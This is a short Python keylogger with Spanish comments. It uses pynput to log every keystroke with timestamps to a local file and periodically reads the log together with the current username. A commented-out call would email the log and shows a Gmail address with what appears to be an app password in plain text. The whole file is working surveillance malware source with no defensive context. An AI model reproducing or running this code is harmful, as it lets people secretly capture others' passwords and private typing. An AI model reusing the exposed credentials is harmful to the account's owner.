from pynput.keyboard import Key, Listener

import getpass
import sys, logging
import time, datetime

tiempo_espera = 20
global hora_envio
hora_actual = time.time()
hora_envio= hora_actual + tiempo_espera

# Archivo log donde se guardan los caracteres
ruta_log = "c:\\test\\data.txt"
logging.basicConfig(filename = (ruta_log), level = logging.DEBUG, format='%(asctime)s.%(msecs)03d, %(message)s',
    datefmt="%Y-%m-%d %H:%M:%S")


def detectarTeclaPresionada(key):
    ingresarTeclaPresionada(key)
    global hora_envio
    if esTiempoDeEnviar():
        enviarDatos()
        hora_envio = time.time() + tiempo_espera

def obtenerDatosPC():
    return 0

def ingresarTeclaPresionada(key):
    # Funcion que inserta la tecla pulsada al archivo Log
    logging.info(str(key)) 



def esTiempoDeEnviar():
    # Funcion booleana que devuelve verdadero cuando la hora actual 
    # ha superado la hora de envio.
    global hora_envio
    if time.time() > hora_envio:
        return True
    else:
        return False

def darFormatoLog(encodingType):
    # Funcion que pone el archivo en formato de decodificacion UTF-8 o ANSI
    with open(ruta_log, "r", encoding = encodingType) as f:
            username = getpass.getuser()
            actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            data = f.read()
            data = "Log capturado a las: " + actualdate + "\n" + data
            #enviarCorreo("andresvar815@gmail.com", "egkxdirvbtjogjgi", "andresvar815@gmail.com",
            #            "Log - " + username + " - " + actualdate, data)
            f.seek(0)

def enviarDatos():
    try:
        darFormatoLog("UTF-8")
    except:
        darFormatoLog("ANSI")


if __name__ == "__main__":
    # Inicio del programa
    print("iniciando")
    with Listener(on_press = detectarTeclaPresionada) as Listener:
        Listener.join()
